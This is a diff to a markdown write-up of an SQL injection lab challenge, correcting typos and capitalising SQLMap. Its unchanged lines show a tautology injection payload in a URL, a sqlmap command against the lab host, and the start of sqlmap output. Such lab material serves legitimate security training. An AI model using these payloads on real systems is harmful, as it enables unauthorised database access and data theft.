@@ -13,7 +13,7 @@
 
 - How to find SQL injection vulnerabilities manually
 - How to determine if a SQL injection is of type "blind" or "error based"
-- How to extract information from a database using sqlmap
+- How to extract information from a database using SQLMap
 
 ## Steps
 
@@ -30,13 +30,13 @@ Change the book number with the payload below.
 
 http://1.challenge.sqli.site/view_book.php?id=9999%20or%201=1--%20-
 
-There are no book with number 9999, as the secont part of the payload is 1=1, this will match all books, and so, the page show the first retrieved.
+There is no book with number 9999, as the second part of the payload is 1=1, this will match all books, and so, the page show the first retrieved.
 
-Send the original url to sqlmap.
+Send the original url to SQLMap.
 
 sqlmap -u http://1.challenge.sqli.site/view_book.php?id=1 --batch --dbms=mysql
 
-After a few moments sqlmap will return with the follow results.
+After a few moments SQLMap will return with the follow results.
 
 GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
 sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
